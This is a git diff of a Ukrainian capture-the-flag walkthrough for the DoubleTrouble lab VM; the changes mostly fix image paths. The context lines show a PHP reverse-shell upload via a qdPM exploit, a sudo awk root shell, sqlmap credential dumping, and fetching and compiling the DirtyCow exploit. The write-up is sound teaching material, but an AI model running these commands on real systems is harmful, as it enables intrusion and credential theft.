@@ -48,7 +48,7 @@ sudo nmap -sV --reason 10.0.2.14
 ```
 
 Отримуємо наступне:
-![приклад використання nmap](image-1.png)
+![приклад використання nmap](./doubletrouble/image-1.png)
 
 Таким чином, в нас є умовний доступ до вебверверу та ssh-серверу.
 
@@ -56,7 +56,7 @@ sudo nmap -sV --reason 10.0.2.14
 ### 3. Дослідження вебсервера
 
 У браузері відкриваємо http://10.0.2.14,  отримуємо:
-![main_page](image-2.png)
+![main_page](./doubletrouble/image-2.png)
 
 Передивляємось, з чим маємо справу, виявляється, що це фрішна тулза для менеджерів проєктів.
 
@@ -67,13 +67,13 @@ gobuster dir -u http://10.0.2.14/ -w /usr/share/wordlists/dirbuster/directory-li
 ```
 Отримуємо наступний результат:
 
-![gobuster_results](image-3.png)
+![gobuster_results](./doubletrouble/image-3.png)
 
 Існує декілька варіантів для подальших досліджень, то почнемо.
 Три останніх директорії можуть містити в собі найбільш корисну інформацію для нас, то передивимось їх.
-![backups](image-4.png)
-![secret](image-5.png)
-![batch](image-6.png)
+![backups](./doubletrouble/image-4.png)
+![secret](./doubletrouble/image-5.png)
+![batch](./doubletrouble/image-6.png)
 
 Таким чином, отрмали одну пусту директорію та дві з інформацією.
 Почнемо з зображення, спробуємо перевірити її на прихований зміст за допомогою інструментів стеганоаналізу **stegcracker** або **stegseek**.
@@ -82,48 +82,48 @@ gobuster dir -u http://10.0.2.14/ -w /usr/share/wordlists/dirbuster/directory-li
 stegcracker Downloads/doubletrouble.jpg /usr/share/wordlists/rockyou.txt
 ```
 За декілька хвилин отримуємо настпуний результат:
-![stegcracker](image-7.png)
+![stegcracker](./doubletrouble/image-7.png)
 
 Далі передивляємось зміст файлу:
 ```sh
 cat Downloads/doubletrouble.jpg.out
 ```
 Отримуємо наступний вивід:
-![otis](image-8.png)
+![otis](./doubletrouble/image-8.png)
 
 Далі логінемось в панелі керування:
 
-![qdPM_login](image-9.png)
+![qdPM_login](./doubletrouble/image-9.png)
 
 
 Після логіну бачимо панель керування:
-![qdPM_CP](image-10.png)
+![qdPM_CP](./doubletrouble/image-10.png)
 
 Передивляємось дозволи користувача, бачимо наступне:
-![otis_access](image-11.png)
+![otis_access](./doubletrouble/image-11.png)
 
 Намагаємось завантажити реверсшелл для .php (сподіваємось, що немає перевірки)
 Для прикладу, скористаємось існуючим репозіторієм на ГітХабі:
 https://github.com/pentestmonkey/php-reverse-shell
-![pentestmonkey](image-12.png)
+![pentestmonkey](./doubletrouble/image-12.png)
 
 
 
 Відповідно до знайденої версії qdPM можемо перевірити існування відповідних експлойтів на ресурсі exploit-DB:
-![exploit-db](image-13.png)
+![exploit-db](./doubletrouble/image-13.png)
 
 
 Вносимо відповідні зміни до **php-reverse-shell**
 ![php-reverse-shell](image-16.png)
 
 Внисимо зміни в експлойт
-![48146.py_edit](image-17.png)
+![48146.py_edit](./doubletrouble/image-17.png)
 
 Запускаємо знайдений експлойт
 ![48146.py_run](image-18.png)
 
 Чекаємо, передивляємось файли в uploads, передивляємось їх по черзі та отримуємо реверс-шелл:
-![got_reverse_shell](image-15.png)
+![got_reverse_shell](./doubletrouble/image-15.png)
 
 Бачимо, що повноваження обежені, то наступним кроком будемо шукати далі:
 ```sh
@@ -132,11 +132,11 @@ cat /etc/issue
 ```sh
 uname -a
 ```
-![alt text](image-19.png)
+![alt text](./doubletrouble/image-19.png)
 ```sh
 sudo -l
 ```
-![sudo-l](image-20.png)
+![sudo-l](./doubletrouble/image-20.png)
 
 Наступним кроком формуємо та виконуємо відповудну команду **awk**
 
@@ -145,7 +145,7 @@ sudo awk 'BEGIN { system("/bin/bash") }'
 ```
 Перевіряємо свої дозволи за допомогою **id**,
 бачимо, що отримали рут-права:
-![root](image-21.png)
+![root](./doubletrouble/image-21.png)
 
 ### Пояснення:
 
@@ -202,7 +202,7 @@ sudo /bin/bash
 ```
 Бачимо зміст директорії, в неї лише 2 файла:
 
-![alt text](image-22.png)
+![alt text](./doubletrouble/image-22.png)
 
 Продовжуємо досліджувати знайдену додаткову інформацію, в нашому випадку це образ ВМ.
 Нам потрібно буде розгорнути цей образ як ще одну ВМ.
@@ -211,23 +211,23 @@ cp doubletrouble.ova /var/www/html/
 cd /var/www/html/
 wget http://10.0.2.14/doubletrouble.ova 
 ```
-![doubletrouble.ova](image-23.png)
+![doubletrouble.ova](./doubletrouble/image-23.png)
 
 Існує два шляхи завантаження - або перемикнути в VirtualBox мережевий адаптер
 на **bridged**, або зробити **port forwarding**  для мережі **CTF_Network**.
 В нашому випадку скористаємось другим варіантом, бо він складнишій, але більш безпечний, оскільки бажано тримати всі вразливі ВМ в ізольованому середовищі, 
 яким і є наша NAT мережа.
 
-![port_forwarding4CTF_Network_1](image-24.png)
+![port_forwarding4CTF_Network_1](./doubletrouble/image-24.png)
 після додавання рулів маємо наступне:
-![port_forwarding4CTF_Network_2](image-25.png)
+![port_forwarding4CTF_Network_2](./doubletrouble/image-25.png)
 Правило2 для під'єднання хоста до ВМ з образом (doubletrouble VM) через HTTP.
-![http](image-26.png)
+![http](./doubletrouble/image-26.png)
 Правило3 для під'єднання хоста до ВМ з Kali.
-![ssh](image-27.png)
+![ssh](./doubletrouble/image-27.png)
 Після завантаження образу нової віртаульної машини запускаємо (імпортуємо) її у VirtualBox (CTF_Natnetwork, де вже знаходяться Kali та перша VM doubletrouble).
 Знаходимо цю машинку як і раніше задопомогою ***netdiscover*
-![10.0.2.16](image-28.png)
+![10.0.2.16](./doubletrouble/image-28.png)
 
 Далі проводимо сканування:
 ```sh
@@ -237,16 +237,16 @@ nmap 10.0.2.16 -p- -sV
 
 Сканування виявило лише два відкриті порти на цільовій машині. Доступні стандартні порти 22 та 80, які використовуються відповідно для сервісів SSH та HTTP. Почнемо детальніше досліджувати (enumeration) спочатку HTTP-порт.
 
-![http://10.0.2.16/](image-29.png)
+![http://10.0.2.16/](./doubletrouble/image-29.png)
 
 Ми спробували кілька стандартних комбінацій імені користувача та пароля, але жодна з них не спрацювала на сторінці входу. Тому ми вирішили виконати сканування вебзастосунку з метою переліку (enumeration) файлів і каталогів на цільовому застосунку. Для сканування переліку файлів ми використали інструмент  **dirb**. Використану команду та результати можна побачити на наведеному нижче скріншоті.
 ```sh
 dirb http://10.0.2.16
 ```
-![dirb](image-30.png)
+![dirb](./doubletrouble/image-30.png)
 Оскільки результат отримали негативний, то спробуємо підключити BurpSuit або Zaproxy:
 Запускаємо, пробуємо залогінитись:
-![burp_01](image-31.png)
+![burp_01](./doubletrouble/image-31.png)
 
 Висновки по скріншоту:
 1. Є форма логіну з POST-параметрами
@@ -335,7 +335,7 @@ uname=admin&psw=admin&btnLogin=Login
 **sqlmap -r sql --dbs**
 
 Ми використали інструмент SQLMap для експлуатації вразливості SQL-інʼєкції. Інструмент підтвердив, що параметр name є вразливим до SQL-інʼєкції. Ми застосували опцію --dbs у команді sqlmap, щоб перевірити наявні бази даних, що показано на наведеному нижче скріншоті.
-![sqlmap](image-32.png)
+![sqlmap](./doubletrouble/image-32.png)
 
 Ми використали опцію --tables для перевірки наявних таблиць у базі даних. У базі даних була виявлена лише одна таблиця з назвою users. Таблиця users може містити облікові дані для входу в систему. Перевірмо доступний вміст таблиці users у базі даних.
 
@@ -345,7 +345,7 @@ uname=admin&psw=admin&btnLogin=Login
 sqlmap -u sql doubletruble –tables
 ```
 Результат:
-![tables](image-33.png)
+![tables](./doubletrouble/image-33.png)
 
 ---
 
@@ -357,7 +357,7 @@ sqlmap -u sql doubletruble –tables
 sqlmap -r sql -D doubletrouble -T users --columns
 ```
 Результат:
-![users](image-34.png)
+![users](./doubletrouble/image-34.png)
 
 
 Доступними стовпцями є **`username`** та **`password`**. Ми вибрали та використали параметр **`--dump`**, щоб завантажити повну інформацію з бази даних. Команду, використану для цього, і результати можна побачити нижче.
@@ -368,7 +368,7 @@ sqlmap -r sql -D doubletrouble -T users --columns
 sqlmap -r sql -D doubletrouble -T users -C password,username --dump
 ```
 Результат:
-![passwords](image-35.png)
+![passwords](./doubletrouble/image-35.png)
 
 
 Інструмент виявив дві пари імен користувачів і паролів, збережених у відкритому (незашифрованому) вигляді в базі даних. Ми використали ці дані на сторінці входу цільового застосунку, але це не спрацювало. Оскільки нам відомо, що порт SSH також відкритий, на наступному кроці ми спробуємо увійти через SSH, використовуючи ці облікові дані.
@@ -383,7 +383,7 @@ sqlmap -r sql -D doubletrouble -T users -C password,username --dump
 ssh clapton@192.168.1.24
 ```
 Результат:
-![ssh](image-36.png)
+![ssh](./doubletrouble/image-36.png)
 
 Як видно вище, вхід був успішним, і ми увійшли на цільову машину. Правильні дані для входу наведені нижче для довідки:
 
@@ -398,10 +398,10 @@ ssh clapton@192.168.1.24
 cat user.txt
 ```
 Результат:
-![user_flag](image-37.png)
+![user_flag](./doubletrouble/image-37.png)
 
 Файл із користувацьким прапорцем `user.txt` видно на наведеному вище скріншоті. Оскільки для завершення CTF-завдання потрібно підвищити привілеї до рівня root, ми виконали перелік інформації про операційну систему та ядро на цільовій машині. Відомості про версію ОС та ядра можна побачити на скріншоті вище. Ми виконали пошук в інтернеті, щоб визначити відомі вразливості у встановлених версіях.
-![exploitdb](image-38.png)
+![exploitdb](./doubletrouble/image-38.png)
 
 Було ідентифіковано вразливість підвищення привілеїв у встановленій операційній системі. Експлойт також був публічно доступний на сайті exploit-DB, що показано нижче.
 
@@ -409,7 +409,7 @@ cat user.txt
 
 Результат:
 
-![dirtycow](image-39.png)
+![dirtycow](./doubletrouble/image-39.png)
 
 Згідно з інформацією, доступною на сайті exploit-DB, ми можемо виконати експлойт на вразливій цілі. Він надасть root-доступ шляхом експлуатації файлу **`/etc/passwd`**. Отже, завантажимо експлойт на цільову машину.
 
@@ -418,7 +418,7 @@ cat user.txt
 ```
 wget https://www.exploit-db.com/raw/40839
 ```
-![check_serts](image-40.png)
+![check_serts](./doubletrouble/image-40.png)
 
 Ми використали утиліту `wget` для завантаження експлойту, вказавши URL exploit-DB. Після завантаження скомпілюємо експлойт за допомогою компілятора `gcc`.
 
@@ -427,7 +427,7 @@ wget https://www.exploit-db.com/raw/40839
 ```
 gcc -pthread exploit.c -o dirty -lcrypt
 ```
-![compiled](image-41.png)
+![compiled](./doubletrouble/image-41.png)
 
 Після процесу компіляції в каталозі `tmp` було створено два файли. Згідно з описом на сайті експлойту, необхідно виконати файл з назвою **`dirty`** і ввести новий пароль для користувача root. Типове ім’я облікового запису з root-привілеями — **`firefart`**.
 
@@ -437,7 +437,7 @@ gcc -pthread exploit.c -o dirty -lcrypt
 ./dirty
 su firefart
 ```
-![firefart](image-42.png)
+![firefart](./doubletrouble/image-42.png)
 
 Як видно вище, ми змінили пароль root, що надало нам доступ до цільової машини від імені користувача **`root`**. Це було підтверджено виконанням команди `id`. Далі ми переглянули файли на цільовій машині вже як користувач root, щоб знайти root-прапорець і завершити завдання.
 
@@ -447,9 +447,10 @@ su firefart
 cat /root/root.txt
 ```
 Результат:
-![rootflag](image-43.png)
+![rootflag](./doubletrouble/image-43.png)
 Як видно на наведеному вище скріншоті, root-прапорець було знайдено в каталозі root на цільовій машині. Файл мав назву **`root.txt`**, і його вміст показано на скріншоті.
 
 
 
 Вітання, CTF VM DoubleTrouble пройдена!
+
